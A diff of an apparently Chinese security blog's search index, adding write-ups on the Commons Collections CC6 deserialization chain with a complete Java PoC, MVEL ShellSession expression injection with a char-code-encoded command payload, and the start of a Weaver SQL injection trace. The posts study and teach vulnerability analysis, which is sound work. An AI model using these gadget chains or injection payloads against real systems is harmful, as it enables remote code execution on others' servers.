+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218493629-bfd47bb2-7c68-4af8-82c5-56c3aa162198.png"
+                      class="" title="img"
+                > 
+
+<p>这就是我们要加上删除key的操作的原因</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218516554-806c2ac5-1e3c-4aaa-bdea-3f28b0914b25.png"
+                      class="" title="img"
+                > 
+
+<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Poc &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap,new ConstantTransformer(&quot;1&quot;));</span><br><span class="line">        //这里传一个没啥用的transformer对象，先put进去再修改，不然put的时候就已经执行命令了</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;2&quot;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,&quot;3&quot;);</span><br><span class="line">        lazyMap.remove(&quot;2&quot;);</span><br><span class="line">        //******************//删除键值很重要</span><br><span class="line">        Class&lt;?&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Field factory_ = lazyMapClass.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory_.setAccessible(true);</span><br><span class="line">        factory_.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        System.out.println(lazyMap);</span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
 ]]></content>
       <categories>
         <category>漏洞原理分析</category>
       </categories>
       <tags>
-        <tag>Fastjson</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -767,6 +850,170 @@
       </tags>
   </entry>
   <entry>
+    <title>MVEL表达式漏洞利用方式</title>
+    <url>/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<p>MVEL 是一个表达式语言，一般用于解析和执行基于 Java 基础语言和语法风格的表达式。在动态规则执行和条件匹配方面，MVEL 是一个出色的选择，因为它允许你在运行时定义和修改规则，并立即处理这些规则。</p>
+<p><em>由上面这句话可以看出他可以执行基本的Java语句，那就有可能造成命令执行</em> </p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li>maven</li>
+</ul>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mvel&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mvel2&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.4.4.Final&lt;/version&gt; &lt;!-- 你可以根据需要选择其他版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="MVEL-eval-expression"><a href="#MVEL-eval-expression" class="headerlink" title="MVEL.eval(expression)"></a>MVEL.eval(expression)</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313221728551.png"
+                      class="" title="image-20250313221728551"
+                > 
+
+<p>成功弹出了计算器，说明我们的java代码被正确的执行了。<br>此时可以得出如果我们在白盒审计中发现MVEL直接调用eval函数，那我们就可以插入恶意的java代码去造成命令执行。</p>
+<h2 id="ShellSession"><a href="#ShellSession" class="headerlink" title="ShellSession"></a>ShellSession</h2><p>这是个MVEL表达式里面的一个类，这个类也可以造成命令执行，但是需要对我们传入的字符串进行一定的处理。<br>且他造成命令执行的入口并不是eval函数，而是他有参构造函数的时候一步一步调用到eval。如果实例化的行为可控，那就可以造成漏洞。</p>
+<p>恶意代码</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.mvel2.sh.ShellSession;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String expression = &quot;push Runtime.getRuntime().exec(String.valueOf((char)111)+String.valueOf((char)112)+String.valueOf((char)101)+String.valueOf((char)110)+String.valueOf((char)32)+String.valueOf((char)45)+String.valueOf((char)97)+String.valueOf((char)32)+String.valueOf((char)67)+String.valueOf((char)97)+String.valueOf((char)108)+String.valueOf((char)99)+String.valueOf((char)117)+String.valueOf((char)108)+String.valueOf((char)97)+String.valueOf((char)116)+String.valueOf((char)111)+String.valueOf((char)114));&quot;;//这个是弹出计算器的命令</span><br><span class="line">        ShellSession shellSession = new ShellSession(expression);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="ShellSession-String-init"><a href="#ShellSession-String-init" class="headerlink" title="ShellSession(String init)"></a>ShellSession(String init)</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222212134.png"
+                      class="" title="image-20250313222212134"
+                > 
+
+<p>他的有参构造函数调用了exec</p>
+<h4 id="exec-String-command"><a href="#exec-String-command" class="headerlink" title="exec(String command)"></a>exec(String command)</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222254259.png"
+                      class="" title="image-20250313222254259"
+                > 
+
+<p>这里将传入的字符串根据换行符分开，每次循环的时候取出一个，然后我们继续跟进_exec</p>
+<h4 id="exec"><a href="#exec" class="headerlink" title="_exec()"></a>_exec()</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222418477.png"
+                      class="" title="image-20250313222418477"
+                > 
+
+<p>这里会对我们刚才提取的inBuffer参数进行根据空格来分割，例如open -a Calculator 会分成 [‘open’,’-a’,’Calculator’]放入数组intokens里面<br>passParameters &#x3D; new String[inTokens.length - 1]提取了我们分隔出来的数组的最后一个参数，如例子那就是Calculator</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222659853.png"
+                      class="" title="image-20250313222659853"
+                > 
+
+<p>提取inTokens数组里面第一个作为类，然后去执行execute方法。</p>
+<h4 id="pushContext类的利用"><a href="#pushContext类的利用" class="headerlink" title="pushContext类的利用"></a>pushContext类的利用</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222824212.png"
+                      class="" title="image-20250313222824212"
+                > 
+
+<p>这里面是存在MVEL.eval()的函数调用的，如果args参数可控，我们即可造成漏洞。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222924300.png"
+                      class="" title="image-20250313222924300"
+                > 
+
+<p>所以我们要满足三个条件</p>
+<ul>
+<li>第一个被空格分隔提取的参数要为对应类的key，假如push对应pushContext</li>
+<li>inTokens数组的长度要大于1，才会给我们的passParameters参数赋值</li>
+<li>this.commands.get(inTokens[0]))看看是否可以让他对应的类为pushContext</li>
+</ul>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223338551.png"
+                      class="" title="image-20250313223338551"
+                > 
+
+<p>跟进去</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223353224.png"
+                      class="" title="image-20250313223353224"
+                > 
+
+<p>走到有参构造这里，init字符串就是我们的恶意payload</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223434006.png"
+                      class="" title="image-20250313223434006"
+                > 
+
+<p>这里根据我们的\n符号去分隔我们的字符串，但是我们没有换行，有<strong>空格</strong> ，所以就没有被分隔</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223547230.png"
+                      class="" title="image-20250313223547230"
+                > 
+
+<p>继续跟进发现我们的字符串被空格分隔了，分成了push和后面的那部份</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223806525.png"
+                      class="" title="image-20250313223806525"
+                > 
+
+<p>此时如果inTokens里面的第一个参数是push，则可以指向我们的漏洞利用类</p>
+<p>因为inTokens&gt;1所以进入给参数赋值</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223658474.png"
+                      class="" title="image-20250313223658474"
+                > 
+
+<p>走到这里漏洞利用的地方</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223940229.png"
+                      class="" title="image-20250313223940229"
+                > 
+
+<p>就可以理解为pushContext.execute(this,我们的恶意java代码)</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223907924.png"
+                      class="" title="image-20250313223907924"
+                > 
+
+<p>最后走向我们的MVEL的eval函数利用点</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313224034230.png"
+                      class="" title="image-20250313224034230"
+                > 
+
+<p>最后弹出了计算器。</p>
+<h3 id="paylaod分析"><a href="#paylaod分析" class="headerlink" title="paylaod分析"></a>paylaod分析</h3><ul>
+<li>首先我们需要用到类pushContext，又因为他获取这个类是从map里面get(key)提取的，push-&gt;pushContext，所以我们的恶意字符串第一个参数要为push，然后第二个参数是我们的恶意代码，恶意代码跟push会根据空格分开<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313224215688.png"
+                      class="" title="image-20250313224215688"
+                > </li>
+<li>然后为什么不直接用open -a Calculator呢，因为这个命令中间也有空格，那参数就会被分开，所以需要转换为ascall码对应的字符串去拼接，就是中间不能出现空格<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313224342726.png"
+                      class="" title="image-20250313224342726"
+                ></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/2025/03/11/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
@@ -785,288 +1032,120 @@
 ]]></content>
   </entry>
   <entry>
-    <title>CC6反序列化链</title>
-    <url>/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
-    <content><![CDATA[<img  
+    <title>泛微ReceiveTodoRequestByXml_SQL注入漏洞</title>
+    <url>/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="接口跟踪分析"><a href="#接口跟踪分析" class="headerlink" title="接口跟踪分析"></a>接口跟踪分析</h2><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732217521294-561919d4-5333-40a4-b10e-3769df62eb9b.png"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934498866-18a10609-e8e2-4300-8f28-0e040d94a1a0.png"
+                      class="" title="img"
+                > 
+
+<p>实例化函数没东西</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934603460-058cf085-1437-4298-90e0-6a62de1a8df6.png"
                       class=""
                 > 
 
-<p>CC6底层用的也是invokertransformer的transform去进行命令执行</p>
-<p>然后用的是lazymap这条链子</p>
-<ul>
-<li><p>利用的依赖</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div></li>
-</ul>
-<h2 id="底层出口LazyMap-InvokerTransformer"><a href="#底层出口LazyMap-InvokerTransformer" class="headerlink" title="底层出口LazyMap+InvokerTransformer"></a>底层出口LazyMap+InvokerTransformer</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class CC6_1 &#123;</span><br><span class="line">    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        //初始化InvokerTransformer</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map decorateMap = LazyMap.decorate(hashMap, invokerTransformer);</span><br><span class="line">        //利用LazyMap的decorate去初始化LazyMap内部的factory，然后get函数里面存在factory.transfer()</span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Method lazyGetMethod = lazyMapClass.getDeclaredMethod(&quot;get&quot;, Object.class);</span><br><span class="line">        lazyGetMethod.setAccessible(true);</span><br><span class="line">        //让get函数可以被直接操作</span><br><span class="line">        lazyGetMethod.invoke(decorateMap, runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们顺着代码来吧</p>
-<h4 id="InvokerTransformer初始化-利用方式"><a href="#InvokerTransformer初始化-利用方式" class="headerlink" title="InvokerTransformer初始化+利用方式"></a>InvokerTransformer初始化+利用方式</h4><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184143397-2a3dd1e4-5620-4b58-a911-cfd8ba39d109.png"
-                      class="" title="img"
-                > 
-
-<p>我们查看InvokerTransformer这个类</p>
+<p>看下面的函数调用</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184234521-97287f70-915b-433f-85e9-3bbc62f8ed65.png"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934626851-89128d09-b5f9-403b-b054-379fde6cf32f.png"
                       class="" title="img"
                 > 
 
-<p>里面存在这个初始化函数，这里面的参数已经够我们想到如果有地方可以invoke调用就可以造成rce了</p>
+<p>现在的步骤是<br>实例化-&gt;processDoneRequestByXml-&gt;processDoneRequestByMap</p>
+<p>看processDoneRequestByMap</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184279009-bcc5128e-fae0-4eed-befd-325c69d52140.png"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934718200-434fd29d-682f-400b-93f2-ce209d226183.png"
                       class="" title="img"
                 > 
 
-<p>这里还真的有，并且input参数是我们传入的，传入个Runtime对象就可以实现RCE了</p>
-<h4 id="LazyMap初始化以及利用"><a href="#LazyMap初始化以及利用" class="headerlink" title="LazyMap初始化以及利用"></a>LazyMap初始化以及利用</h4><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184381641-a533fdb3-f0f7-454f-8ab3-e526270c984b.png"
-                      class="" title="img"
-                > 
-
-<p>我们查看下LazyMap的decorate函数</p>
+<p>实例化-&gt;processDoneRequestByXml-&gt;processDoneRequestByMap-&gt;receiveRequestInfo</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184447459-a8fe7ba8-4dcb-4331-b098-0e971bfdcb74.png"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934776768-04bf85e2-8063-4b08-8e4a-84327a7319c2.png"
                       class="" title="img"
                 > 
 
-<p>因为LazyMap下面那个构造函数是protected所以我们无法直接利用，所以利用public的decorate函数去初始化，重点是这一行<strong>this.factory &#x3D; FactoryTransformer.getInstance(factory);</strong> </p>
+<p>看下这个ofsTodoDataManager</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184508030-ef78abb4-0ba4-427d-9b02-d009efbd1580.png"
-                      class=""
-                > 
-
-<p>可以看到factory也是transformer类型，并且它初始化赋值了，所以我们让factory为invokerTransformer的对象</p>
-<p>那我们这时候是不是就只缺一个哪个地方让这个对象**.transfer** 的地方了</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184684820-8cfb7640-6f51-4e9d-a0d8-aec9c8f778cf.png"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934849472-815d2e8a-e10b-4d64-8683-d6bbb091d2ab.png"
                       class="" title="img"
                 > 
 
-<p>LazyMap里面的get函数，factory我们初始化为invokerTransformer的对象了，那他再transofrmer，并且key我们可控，传一个Runtime对象是不是就可以了</p>
+<p>初始为null，看到设置的地方让他为this，看他的类型是OfsTodoDataManagerNew继承的</p>
+<p>如果能让他初始化为自己</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184778636-62da0f9a-06d9-4b27-ac08-8639fd7e6dab.png"
-                      class="" title="img"
-                > 
-
-<h2 id="TiedMapEntry去调用LazyMap的get函数"><a href="#TiedMapEntry去调用LazyMap的get函数" class="headerlink" title="TiedMapEntry去调用LazyMap的get函数"></a>TiedMapEntry去调用LazyMap的get函数</h2><h3 id="getValue分析"><a href="#getValue分析" class="headerlink" title="getValue分析"></a>getValue分析</h3><p>因为我们需要找到一个地方是可以readobject里面调用get并且参数和对象可控的，但是没有找到适配的，所以我们就要再往上找</p>
-<p>某某函数-&gt;LazyMap.get()</p>
-<p>依据ysoSerial链子找到了TiedMapEntry</p>
-<p>我们自己审一下先，这个类哪里可以调用get，并且参数是否可控</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184993706-a24e292b-c7eb-40db-840f-6d544d9288b7.png"
-                      class="" title="img"
-                > 
-
-<p>看到他的getValue函数，他是map.get(key)</p>
-<p>如果map可以为LazyMap，我们初始化他的factory对象为InvokerTransformer对象</p>
-<p>然后LazyMap调用get是不是就是上面的</p>
-<p>factory.transfer(key) &#x3D;&#x3D; InvokerTransformer.transfer(key)</p>
-<p>那如果key可控为Runtime.class呢</p>
-<p>factory.transfer(runtime) &#x3D;&#x3D; InvokerTransformer.transfer(runtime)</p>
-<p>就实现RCE了</p>
-<p>去看看TiedMapEntry含有什么参数并且怎么实例化的</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185253051-d272f369-f8d6-4d91-8cfb-fed77ce2eeca.png"
-                      class="" title="img"
-                > 
-
-<p>可以看出他可以序列化这个TiedMapEntry</p>
-<p>然后map也是Map对象，LazyMap是Map的子类，所以二者其实一样的</p>
-<p>Object可以是个对象，那就是刚好如果可控给他一个Runtime对象</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185336849-ce7efe4e-dc9f-44b4-b53c-b22911b9e6cb.png"
-                      class="" title="img"
-                > 
-
-<p>实例化不仅是public而且两个特别需要的参数都是可控的 </p>
-<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC6_2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //TiedMapEntry 里面存在get函数的调用，我们可以用它来调用lazymap</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        //实例化Runtime对象</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        //实例化InvokerTransformer对象</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map decorateMap = LazyMap.decorate(hashmap,invokerTransformer);</span><br><span class="line">        //实例化LazyMap对象</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap,runtime);</span><br><span class="line">        //实例化TiedMapEntry对象</span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line">        //getValue函数为public，直接调用</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>真的很简单写下来就会发现</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185886275-80fcbeac-6e3b-411a-aa65-c74ca0b26aa2.png"
-                      class="" title="img"
-                > 
-
